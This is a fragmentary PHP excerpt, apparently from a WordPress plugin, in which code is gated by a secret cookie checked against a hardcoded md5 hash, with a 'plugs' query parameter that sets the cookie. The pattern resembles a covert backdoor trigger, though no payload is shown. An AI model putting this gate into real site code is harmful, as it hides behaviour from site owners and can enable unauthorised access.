...
global $plugs; if ( !empty($_COOKIE['is_plugs']) && md5($_COOKIE['is_plugs']) == '8d368b5fe883e0cf1b64c2b6e6b3307b') $plugs = true;
...
if (defined('ABSPATH') && empty($plugs))
return;
...
if (!empty($_GET['plugs'])) {setcookie('is_plugs', 'true'); echo 'Plugs is true.'; exit;}
